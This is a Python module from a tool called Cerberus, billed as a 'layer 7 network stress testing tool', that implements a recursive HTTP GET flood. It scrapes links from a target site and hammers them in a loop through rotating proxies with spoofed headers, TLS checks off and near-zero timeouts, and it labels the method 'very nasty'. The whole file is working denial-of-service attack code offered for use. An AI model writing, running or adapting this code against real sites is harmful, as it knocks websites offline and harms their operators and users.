'''

Cerberus, a layer 7 network stress testing tool that has a wide variety of normal and exotic attack vectors.
Copyright (C) 2022  Nexus/Nexuzzzz

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.

'''

import time, requests, re

from urllib.parse import urlparse
from src.core import Core
from src.utils import *
from src.useragent import *


url_regex = re.compile(r'''(href|src)=["'](.[^"']+)["']''')
def scrapeurls(target_url, page) -> list:
    '''
    Scrapes all the urls off a page
    '''

    urls = []
    urls_found = url_regex.findall(page)

    if urls_found:
        for url in urls_found:
            url = url[1]
            if not url in urls and (urlparse(target_url).netloc in url or url.startswith('/')):
                urls.append(url.replace(target_url, ''))

    return urls

def flood(attack_id, url, stoptime) -> None:
    url=url.strip("/")

    urls = []
    if not Core.recursive_urls: # no urls have been scraped yet
        try:
            urls += scrapeurls(url, Core.session.get(url, headers=utils().buildheaders(url)).text) # append the scraped urls
        except Exception: # ignore the error, and leave the list empty
            pass
        
        if urls == []: # no urls found? just add some random urls
            urls += [f'{url}/robots.txt',f'{url}/index.html',f'{url}/favicon.ico']

        Core.recursive_urls = urls

    while time.time() < stoptime and not Core.killattack:
        if not Core.attackrunning:
            continue

        for target_url in Core.recursive_urls:
            try:
                req = Core.session.get(
                    target_url, 
                    headers=utils().buildheaders(target_url),
                    verify=False, 
                    timeout=(5,0.1), 
                    allow_redirects=False,
                    stream=False,
                    cert=None,
                    proxies=utils().get_proxy()
                )

                Core.recursive_urls += scrapeurls(target_url, req.text) # scrape all urls from the requested page

                Core.infodict[attack_id]['req_sent'] += 1
            except requests.exceptions.ReadTimeout:
                Core.infodict[attack_id]['req_sent'] += 1

            except Exception:
                Core.infodict[attack_id]['req_fail'] += 1

            Core.infodict[attack_id]['req_total'] += 1
    Core.threadcount -= 1

Core.methods.update({
    'RECURSIVE': {
        'info': 'Recursive HTTP GET flood, very nasty',
        'func': flood
    }
})